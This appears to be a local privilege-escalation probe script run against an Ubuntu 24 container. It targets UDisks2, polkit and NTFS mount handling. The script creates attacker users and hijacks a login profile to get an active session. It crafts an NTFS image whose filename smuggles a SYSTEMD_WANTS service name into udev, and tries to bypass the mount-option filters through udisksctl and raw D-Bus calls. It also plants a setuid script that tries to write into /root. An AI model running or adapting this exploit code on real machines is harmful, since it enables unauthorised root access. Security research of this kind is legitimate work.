#!/usr/bin/env bash
set -euo pipefail

container="${1:-ubuntu24-server-lpe-target}"
workspace="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
log="$workspace/logs/active-udisks-ntfs-options.out"
mkdir -p "$workspace/logs"

docker exec -i "$container" bash -s >"$log" 2>&1 <<'EOS'
set -Eeuo pipefail

name=active-udisks-ntfs-options
tmp="/tmp/$name"
home="/home/selfauth/$name"
root_marker="/root/${name}-root"
run_marker="/run/${name}-root"
tmp_marker="/tmp/${name}-root"

cleanup_target() {
  set +e
  findmnt -rn -o TARGET | grep -E '^/media/selfauth/(NTFS|active-udisks-ntfs)' |
    sort -r | xargs -r -n1 umount >/dev/null 2>&1 || true
  losetup -a | awk -F: '/active-udisks-ntfs-options/ {print $1}' |
    xargs -r -n1 losetup -d >/dev/null 2>&1 || true
  pkill -f 'ntfs-3g.*active-udisks-ntfs-options' >/dev/null 2>&1 || true
  loginctl terminate-user selfauth >/dev/null 2>&1 || true
  systemctl start getty@tty1.service >/dev/null 2>&1 || true
  rm -f /home/selfauth/.bash_profile
  rm -rf "$home" "$tmp" "$root_marker" "$run_marker" "$tmp_marker" /tmp/active-udisks-ntfs-nosuid-user
  systemctl reset-failed udisks2.service systemd-udevd.service getty@tty1.service >/dev/null 2>&1 || true
}
trap cleanup_target EXIT

rm -rf "$tmp" "$home" "$root_marker" "$run_marker" "$tmp_marker"
mkdir -p "$tmp" "$home"
chmod 1777 "$tmp"

id attacker >/dev/null 2>&1 || useradd -m -s /bin/bash attacker
id selfauth >/dev/null 2>&1 || useradd -m -s /bin/bash selfauth
echo selfauth:selfauth | chpasswd
usermod -G selfauth selfauth
chown -R selfauth:selfauth "$home"

{
  echo "active UDisks NTFS mount option trust-boundary probe"
  date --iso-8601=seconds
  echo
  echo "## target/default proof"
  sed -n '1,8p' /etc/os-release
  uname -a
  id attacker
  id selfauth
  dpkg-query -W -f='${binary:Package}\t${Version}\t${db:Status-Abbrev}\n' \
    udisks2 libudisks2-0 ntfs-3g fuse3 polkitd systemd udev 2>&1 | sort
  echo

  echo "## service and policy proof"
  systemctl is-enabled udisks2.service 2>&1 || true
  systemctl is-active udisks2.service 2>&1 || true
  systemctl cat udisks2.service 2>&1 | sed -n '1,80p'
  awk '/org.freedesktop.udisks2.loop-setup/{flag=1} flag{print} /<\/action>/{if(flag) exit}' \
    /usr/share/polkit-1/actions/org.freedesktop.UDisks2.policy
  awk '/org.freedesktop.udisks2.filesystem-mount/{flag=1} flag{print} /<\/action>/{if(flag) exit}' \
    /usr/share/polkit-1/actions/org.freedesktop.UDisks2.policy
  echo

  echo "## NTFS mount option defaults"
  nl -ba /etc/udisks2/mount_options.conf.example | sed -n '33,56p'
  for p in /bin/ntfs-3g /usr/bin/ntfs-3g /sbin/mount.ntfs-3g /usr/sbin/mkfs.ntfs \
    /etc/udisks2 /etc/udisks2/mount_options.conf /etc/udisks2/mount_options.conf.example \
    /media /media/selfauth; do
    [ -e "$p" ] || [ -L "$p" ] && stat -Lc '%A %a %U:%G %F %n -> %N' "$p" 2>&1 || echo "MISSING $p"
  done
  echo

  echo "## attacker writable checks"
  for p in /etc/udisks2 /usr/bin /bin /sbin /usr/sbin /media /run/systemd /usr/local/bin /usr/local/sbin /tmp /var/tmp; do
    stat -Lc '%A %U:%G %n' "$p" 2>/dev/null || true
    runuser -u attacker -- test -w "$p" && echo "attacker_writable:$p" || echo "attacker_not_writable:$p"
  done
} >"$tmp/root-prep.out" 2>&1

cat >"$home/probe.sh" <<'SH'
#!/bin/bash
set +e
name=active-udisks-ntfs-options
home="/home/selfauth/$name"
out="/tmp/$name/user.out"
exec >"$out" 2>&1

echo "## active selfauth session"
id
tty
echo "XDG_SESSION_ID=${XDG_SESSION_ID:-}"
if [ -n "${XDG_SESSION_ID:-}" ]; then
  loginctl show-session "$XDG_SESSION_ID" -p Id -p User -p Name -p Seat -p TTY -p Active -p State -p Type -p Class -p Remote
fi
echo

img="$home/ntfs-SYSTEMD_WANTS=ntfs-options-pwn.service.img"
echo "## create attacker NTFS image"
truncate -s 96M "$img"
mkfs.ntfs -F -Q -L 'NTFS_PWN' "$img"
ls -l "$img"
blkid -p -o export "$img" 2>&1 || true
echo

echo "## active loop setup"
setup="$(udisksctl loop-setup -f "$img" --no-user-interaction 2>&1)"
echo "$setup"
dev="$(printf '%s\n' "$setup" | sed -n 's/.* as \(\/dev\/loop[0-9]\+\).*/\1/p' | tail -1)"
echo "dev=$dev"
udevadm settle --timeout=15 2>&1 || true
if [ -n "$dev" ]; then
  udevadm info --query=property --name "$dev" 2>&1 | grep -E '^(DEVLINKS|ID_FS|ID_LOOP|SYSTEMD|UDISKS)' | sort || true
  ls -l /dev/disk/by-label /dev/disk/by-uuid /dev/disk/by-loop-ref 2>&1 | sed -n '1,160p'
fi
echo

obj="/org/freedesktop/UDisks2/block_devices/$(basename "$dev")"
echo "## Filesystem interface"
gdbus introspect --system --dest org.freedesktop.UDisks2 --object-path "$obj" |
  sed -n '/interface org.freedesktop.UDisks2.Filesystem/,/};/p'
echo

try_mount() {
  local label="$1"
  local opts="$2"
  echo "### mount case: $label opts=[$opts]"
  if [ -n "$opts" ]; then
    mout="$(udisksctl mount -b "$dev" -o "$opts" --no-user-interaction 2>&1)"
  else
    mout="$(udisksctl mount -b "$dev" --no-user-interaction 2>&1)"
  fi
  rc=$?
  echo "$mout"
  echo "mount_rc=$rc"
  mp="$(printf '%s\n' "$mout" | sed -n 's/^Mounted .* at //p' | sed 's/\.$//' | tail -1)"
  if [ -n "$mp" ] && findmnt "$mp" >/dev/null 2>&1; then
    echo "mountpoint=$mp"
    findmnt -no TARGET,SOURCE,FSTYPE,OPTIONS "$mp" 2>&1 || true
    stat -c '%A %a %U:%G %n' /media /media/selfauth "$mp" 2>&1 || true
    cat >"$mp/ntfs_probe_exec.sh" <<'EOF'
#!/bin/sh
id
id > /root/active-udisks-ntfs-options-root 2>/dev/null || true
id > /run/active-udisks-ntfs-options-root 2>/dev/null || true
id > /tmp/active-udisks-ntfs-nosuid-user 2>/dev/null || true
EOF
    chmod 4755 "$mp/ntfs_probe_exec.sh" 2>&1 || true
    stat -c '%A %a %U:%G %n' "$mp/ntfs_probe_exec.sh" 2>&1 || true
    "$mp/ntfs_probe_exec.sh" 2>&1 || true
    ls -l /root/active-udisks-ntfs-options-root /run/active-udisks-ntfs-options-root /tmp/active-udisks-ntfs-nosuid-user 2>&1 || true
    udisksctl unmount -b "$dev" --no-user-interaction 2>&1 || umount "$mp" 2>&1 || true
  fi
  echo
}

echo "## udisksctl option-filter matrix"
try_mount default ""
try_mount allowed_umask "umask=000,fmask=000,dmask=000,big_writes"
try_mount rejected_uid0 "uid=0,gid=0,umask=000"
try_mount rejected_suid "suid,exec"
try_mount rejected_dev "dev"
try_mount rejected_permissions "permissions"
try_mount comma_in_locale "locale=en_US.UTF-8,permissions"
try_mount allow_other "allow_other"

echo "## direct D-Bus Mount option bypass attempts"
for opts in \
  "uid=0,gid=0,suid,dev,exec,permissions" \
  "locale=en_US.UTF-8,permissions" \
  "umask=000,fmask=000,dmask=000,big_writes"; do
  echo "### gdbus Mount options=[$opts]"
  gdbus call --system --dest org.freedesktop.UDisks2 --object-path "$obj" \
    --method org.freedesktop.UDisks2.Filesystem.Mount \
    "{'options': <'$opts'>, 'auth.no_user_interaction': <true>}" 2>&1
  echo "gdbus_mount_rc=$?"
  findmnt -rn -o TARGET,SOURCE,FSTYPE,OPTIONS | grep "$dev\|/media/selfauth" || true
  mp="$(findmnt -rn -S "$dev" -o TARGET | head -1)"
  [ -n "$mp" ] && udisksctl unmount -b "$dev" --no-user-interaction 2>&1 || true
  echo
done

echo "## Check and Repair methods against attacker NTFS image"
for method in Check Repair; do
  echo "### $method"
  gdbus call --system --dest org.freedesktop.UDisks2 --object-path "$obj" \
    --method "org.freedesktop.UDisks2.Filesystem.$method" \
    "{'auth.no_user_interaction': <true>}" 2>&1
  echo "${method}_rc=$?"
done

echo "## user-side root proof"
ls -l /root/active-udisks-ntfs-options-root /run/active-udisks-ntfs-options-root /tmp/active-udisks-ntfs-nosuid-user 2>&1 || true
SH

chmod 0755 "$home/probe.sh"
chown -R selfauth:selfauth "$home"
cat >/home/selfauth/.bash_profile <<'SH'
/home/selfauth/active-udisks-ntfs-options/probe.sh
exit
SH
chown selfauth:selfauth /home/selfauth/.bash_profile

systemctl stop getty@tty1.service >/dev/null 2>&1 || true
timeout 180 openvt -c 1 -s -f -w -- /bin/login -f selfauth || true
systemctl start getty@tty1.service >/dev/null 2>&1 || true
loginctl terminate-user selfauth >/dev/null 2>&1 || true
rm -f /home/selfauth/.bash_profile
udevadm settle --timeout=20 >/dev/null 2>&1 || true

cat "$tmp/root-prep.out"
echo
cat "$tmp/user.out" 2>&1 || true
echo
echo "## root-side postcheck"
ls -l "$root_marker" "$run_marker" /tmp/active-udisks-ntfs-nosuid-user 2>&1 || true
echo "ROOT_PROOF=$(test -e "$root_marker" && echo yes || echo no)"
journalctl -b --no-pager -u udisks2.service -g 'ntfs|active-udisks-ntfs|mount option|Filesystem' -n 180 2>&1 || true
findmnt -rn -o TARGET,SOURCE,FSTYPE,OPTIONS | grep -E 'active-udisks-ntfs|/media/selfauth' || true
systemctl is-active udisks2.service 2>&1 || true
systemctl is-system-running
systemctl --failed --no-legend | wc -l
EOS

echo "log written to $log"
